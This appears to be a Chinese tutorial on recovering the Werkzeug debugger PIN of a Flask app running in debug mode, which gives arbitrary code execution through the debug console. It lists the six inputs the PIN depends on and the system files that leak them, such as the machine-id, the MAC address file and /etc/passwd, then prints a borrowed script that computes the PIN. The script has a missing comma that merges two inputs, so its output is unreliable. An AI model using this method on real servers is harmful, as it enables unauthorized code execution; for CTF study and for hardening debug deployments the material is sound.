    这里的pin码可以理解成某一种认证码。

    输入失败超过10次就会自动锁定，所以不能豪夺，只能智取。

    危害：

    1.会泄露当前报错页面的源码，可供审计挖掘其他漏洞

    2.会泄露Web应用的绝对路径，及Python解释器的路径

    3.debug页面中包含Python的交互式shell，可以执行任意Python代码

    这前两条一般都是与代码审计相关，可以讲难点肯定不在这，然后最后一条就是这里所讲的pin码暴力破解

    碰到这个漏洞的要求是flask模板它开启debug模式（信息泄露已经是非常危险了）

    这个debug页面大概是长这个样子：

    不仅能看报错源码，在旁边有个黑色的小框子点开之后就是这个pin码的界面，破解出这个pin码，就如同之前第三条所述，可以执行任意代码，危险程度非常的高。

    pin码的生成机制感兴趣的话可以自己去网上查找资料，这里不做叙述

    而pin码生成依赖的6个元素我们是知道的：

    1.服务器运行flask所登录的用户名（查看/etc/passwd或者猜，一般为root或者是flaskweb）

    2.modname。一般不变就是flask.app

    3.getattr(app, “name”, app.class.name)。python该值一般为Flask ，值一般不变

    4.flask库下app.py的绝对路径。报错信息会泄露该值。（有点考眼力）

    5.当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address 获取(eth0为网卡名)

    6.机器的id：对于非docker机每一个机器都会有自已唯一的id

    Linux：/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件

    docker：/proc/self/cgroup

    之后就可以开始爆破pin码了：

    使用脚本：（嫖的）

    import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]
private_bits = [
    '2485410388611',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '310e09efcc43ceb10e426a0ffc99add5c651575fe93627e6019400d4520272ed'# get_machine_id(), /etc/machine-id
]
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)
